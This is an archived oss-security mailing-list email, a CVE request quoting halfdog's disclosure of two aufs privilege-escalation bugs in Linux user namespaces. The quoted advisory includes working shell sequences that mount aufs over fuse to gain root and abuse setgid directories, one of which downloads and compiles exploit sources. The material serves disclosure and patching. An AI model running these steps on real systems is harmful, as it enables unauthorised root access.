X-VM-v5-Data: ([nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil]
	["8776" "Wednesday" "2" "March" "2016" "17:30:44" "-0600" "Tyler Hicks" "tyhicks@canonical.com" "<20160302233044.GA21900@boyd>" "219" "Re: [oss-security] CVE Requests: Aufs Union Filesystem Privilege Escalation In User Namespaces" "^Date:" nil nil "3" "2016030223:30:44" "[oss-security] CVE Requests: Aufs Union Filesystem Privilege Escalation In User Namespaces" (number mark "        tyhicks@cano Mar  2  219/8776  " thread-indent "\"Re: [oss-security] CVE Requests: Aufs Union Filesystem Privilege Escalation In User Namespaces\"\n") "<80fa3a77-b8df-722e-0e9f-a0af21bfced3@halfdog.net>" ("<80fa3a77-b8df-722e-0e9f-a0af21bfced3@halfdog.net>") nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil]
	nil)
X-Mozilla-Status: 0001
X-Mozilla-Status2: 00000000
Received: (qmail 32184 invoked by uid 550); 2 Mar 2016 23:30:59 -0000
Mailing-List: contact oss-security-help@lists.openwall.com; run by ezmlm
Precedence: bulk
List-Post: <mailto:oss-security@lists.openwall.com>
List-Help: <mailto:oss-security-help@lists.openwall.com>
List-Unsubscribe: <mailto:oss-security-unsubscribe@lists.openwall.com>
List-Subscribe: <mailto:oss-security-subscribe@lists.openwall.com>
List-ID: <oss-security.lists.openwall.com>
Received: (qmail 32163 invoked from network); 2 Mar 2016 23:30:58 -0000
Message-ID: <20160302233044.GA21900@boyd>
References: <80fa3a77-b8df-722e-0e9f-a0af21bfced3@halfdog.net>
MIME-Version: 1.0
Content-Type: multipart/signed; micalg=pgp-sha512;
	protocol="application/pgp-signature"; boundary="/9DWx/yDrRhgMJTb"
Content-Disposition: inline
In-Reply-To: <80fa3a77-b8df-722e-0e9f-a0af21bfced3@halfdog.net>
User-Agent: Mutt/1.5.24 (2015-08-30)
Date: Wed, 2 Mar 2016 17:30:44 -0600
From: Tyler Hicks <tyhicks@canonical.com>
Reply-To: oss-security@lists.openwall.com
Subject: Re: [oss-security] CVE Requests: Aufs Union Filesystem Privilege
 Escalation In User Namespaces
To: oss-security@lists.openwall.com

--/9DWx/yDrRhgMJTb
Content-Type: text/plain; charset=us-ascii
Content-Disposition: inline
Content-Transfer-Encoding: quoted-printable

Hi MITRE - Can you assign CVEs for these two issues?

 AUFS Over Fuse: Loss of Nosuid

 AUFS Xattr Setgid Privilege Escalation

Thanks!

Tyler

On 2016-02-24 06:14:56, halfdog wrote:
> [http://www.halfdog.net/Security/2016/AufsPrivilegeEscalationInUserNamesp=
aces/]
>=20
> Introduction:
> =3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D
>=20
> * Problem description:
>=20
> Aufs is a union filesystem to mix content of different underlying
> filesystems, e.g. read-only medium with r/w RAM-fs. That is also
> allowed in user namespaces when module was loaded with allow_userns
> option. Due to different bugs, aufs in a crafted USERNS allows
> privilege escalation, which is a problem on systems enabling
> unprivileged USERNS by default, e.g. Ubuntu Wily. All the issues
> mentioned here were discovered after performing similar analysis on
> overlayfs, another USERNS enabled union filesystem.
>=20
> For a system to be exposed, unprivileged USERNS has to be available
> and AUFS support enabled for it by loading the aufs module with the
> appropriate option: modprobe aufs allow_userns.
>=20
> AUFS Over Fuse: Loss of Nosuid:
> =3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=
=3D=3D=3D=3D=3D=3D=3D
>=20
> * Method:
>=20
> Fuse filesystem can be mounted by unprivileged users with the help of
> the fusermount SUID program. Fuse then can simulate files of any type,
> mode, UID but they are only visible to the user mounting the
> filesystem and lose all SUID properties. Those files can be exposed
> using aufs including the problematic SUID properties. The basic
> exploitation sequence is:
>=20
>     Mount fuse filesystem exposing crafted SUID binary
>     Create USERNS
>     Mount aufs on top of fuse
>     Execute the SUID binary via aufs from outside the namespace
>=20
> The issue can then be demonstrated using:
>=20
> test$ mkdir fuse mnt work
> test$ mv SuidExec RealFile
> test$ ./FuseMinimal fuse
> test$ ./UserNamespaceExec -- /bin/bash
> root$ mount -t aufs -o br=3Dwork:fuse none mnt
> root$ cd mnt
> # Now cwd of the former process is within the aufs mount. Use
> # another shell to complete.
> test$ /proc/2390/cwd/file /bin/bash
> root$ id
> uid=3D0(root) gid=3D100(users) groups=3D100(users)
> # Go back to old shell for cleanup.
> root$ cd ..; umount mnt; exit
> test$ fusermount -u fuse
>=20
> * Discussion:
>=20
> In my opinion, fuse filesystem allowed pretending to have files with
> different UIDs/GIDs in the local mount namespace, but they never had
> those properties, those files would have, when really stored on local
> disk. So e.g., the SUID binaries lost their SUID-properties and the
> owner could also modify arbitrary file content, even if file
> attributes were pretending, that he does not have access - by having
> control over the fuse process simulating the filesystem, such access
> control is futile. That is also the reason, why no other user than the
> one mounting the filesystem may have rights to access it by default.
>=20
> In my optionion the workarounds should be to restrict access to fuse
> also only to the mount namespace where it was created.
>=20
> AUFS Xattr Setgid Privilege Escalation:
> =3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=
=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D
>=20
> * Method:
>=20
> Due to inheritance of Posix ACL information (xattrs) when aufs is
> copying files and not cleaning those additional and unintended ACL
> attribues, SGID directories may become user writable, thus allowing to
> gain privileges of this group using methods described in [0]. Suitable
> target directories can be easily found using find / -perm -02020 2>
> /dev/null. On standard Ubuntu system those are:
>=20
> /usr/local/lib/python3.4 (root.staff)
> /var/lib/libuuid (libuuid.libuuid)
> /var/local (root.staff)
> /var/mail (root.mail)
>=20
> Exploitation can be done just combining standard tools with the
> SetgidDirectoryPrivilegeEscalation exploit [0].
>=20
> test$ wget -q
> http://www.halfdog.net/Security/2015/SetgidDirectoryPrivilegeEscalation/C=
reateSetgidBinary.c
> http://www.halfdog.net/Misc/Utils/UserNamespaceExec.c
> http://www.halfdog.net/Misc/Utils/SuidExec.c
> test$ gcc -o CreateSetgidBinary CreateSetgidBinary.c
> test$ gcc -o UserNamespaceExec UserNamespaceExec.c
> test$ gcc -o SuidExec SuidExec.c
> test$ mkdir mnt test
> test$ setfacl -m "d:u:$(id -u):rwx" test
> test$ ./UserNamespaceExec -- /bin/bash
> root$ mount -t aufs -o br=3Dtest:/var none mnt
> root$ chmod 07777 mnt/mail
> root$ umount mnt; exit
> test$ ./CreateSetgidBinary test/mail/escalate /bin/mount x nonexistent-arg
> test$ test/mail/escalate ./SuidExec /usr/bin/id
> uid=3D1000(test) gid=3D8(mail) groups=3D8(mail),100(users)
>=20
> On Ubuntu, exploitation allows interference with mail spool and allows
> to gain privileges of other python processes using python
> dist-packages owned by user root.staff. If root user calls a python
> process in that way, e.g. via apport crash dump tool, local root
> escalation is completed.
>=20
> According to this post [1], directories or binaries owned by group
> staff are in the default PATH of the root user, hence local root
> escalation is trivial.
>=20
>=20
> Results, Discussion:
> =3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D
>=20
> * Fixing the issue itself:
>=20
> As enabling a given file system type to be manipulated by unprivileged
> users, this will significantly increase attack surface. Thus a USERNS
> support should not be added frivolously but only after a good security
> re-audit of the codebase.
>=20
> * Avoiding numerous namespace issues in future:
>=20
> In my opinion, enabing USERNS was a little too fast, as it exposes a
> lot of additional kernel code to users without any special
> capabilities in init-ns by using the elevated privileges within the
> container. This is also recognized by others, but there is dispute on
> the consequences to draw from that. See Patch to disable unprivileged
> userns ... on LKML [2].
>=20
> I completely second the request to have options to disable the USERNS
> layer as it depends on the system type, if USERNS is a net gain
> regarding security or a net loss. It should be a gain on systems,
> where it allows to perform critical operations within a containment, a
> use-case where chroots are used currently. Without USERNS, those
> operations are likely to be performed with SUID helpers in the init-ns
> or privilege separation might be dropped completely as the overhead is
> too large for efficient work procedures.
>=20
> On the other hand, systems where all processes have similar security
> level, e.g. as they all process the same data, further privilege
> separation is not easy. The USERNS support will add only new risks here.
>=20
> Timeline:
> =3D=3D=3D=3D=3D=3D=3D=3D=3D
>=20
> * 20160114: Aufs developers analyzing similar overlayfs issue [3] in [4]
> * 20160213: Discovery
> * 20160214: Report to Aufs contact mentioned on sourceforge [5]
> * 20160219: Fix released: AUFS list post [6]
> * 20161122: CRD and publication together with nearly identical
> overlayfs issue
>=20
> References:
> =3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D
>=20
> [0]
> http://www.halfdog.net/Security/2015/SetgidDirectoryPrivilegeEscalation/
> [1] http://www.openwall.com/lists/oss-security/2016/01/16/7
> [2] https://lkml.org/lkml/2016/1/22/7
> [3]
> http://www.halfdog.net/Security/2015/UserNamespaceOverlayfsSetuidWriteExe=
c/
> [4] https://sourceforge.net/p/aufs/mailman/message/34766916/
> [5] https://sourceforge.net/projects/aufs/
> [6] https://sourceforge.net/p/aufs/mailman/message/34864744/
>=20
> --=20
> http://www.halfdog.net/
> PGP: 156A AE98 B91F 0114 FE88  2BD8 C459 9386 feed a bee

--/9DWx/yDrRhgMJTb
Content-Type: application/pgp-signature; name="signature.asc"

-----BEGIN PGP SIGNATURE-----
Version: GnuPG v1

iQIcBAEBCgAGBQJW13ekAAoJENaSAD2qAscKwZcP/jKhoXtB+QdEDfpFQMljk+QM
9b7U7qIBCoUWZ78YprjSjugU5ARvs8qPlvQewLhiGqfBxeBVWNzUrhtOJzll8a+g
ZdYZaYsZjZs+ZkBSomWCeHoPRCzB2OW8VeA8nhSolE52YU8vyNYadYhLwHJtaXM5
xb4MexGGSYD+0FshWOWgfmFtXpO8/B0idtT5e4imdFlW/aFUIQRa6XmLUATxECDK
IMV2JPDUgpnievprXXu3tZdsiTcaKDli7ZuyV1iFLjYFgofVBSW5bqTiGjzRubt3
QdXDJgx+6/gw/CDgOEO3QoFaV7Z/A/6WXAgEkHCioWyaTCOnVX1k15moNG6tHbTF
qtQp0NeETnDKMHVZgutMvTSt+KuWTAkHdFM9mc8X7eLhDhRJjejx1+2r2skjSIf1
A6M6BbT3slyIGiFQWAucYGhGd12KCr7nYv/JSyGn6r/MS+YiuiiX1fZJFvwOYm4w
E5LVx4AqJA6T2GJ+Fwto4wQTNUxtP7bx/6/ee2t+s9b+mDwKE4c2pR56ZEUT9K1r
d6jjoTaJoukEMMmjYOsTR3dkAb/aQDJQkpOeCIcp9+QhqSWZyOdfPneZthbaAIWn
p1jmp7t8pzHalpTG5oMzsfwQuL6yRliOvdjAUQE/ds9hEKpomFG5p3y4fu4kt/aR
+s4e3r+lyiKeqA2JtTz6
=5DN+
-----END PGP SIGNATURE-----

--/9DWx/yDrRhgMJTb--
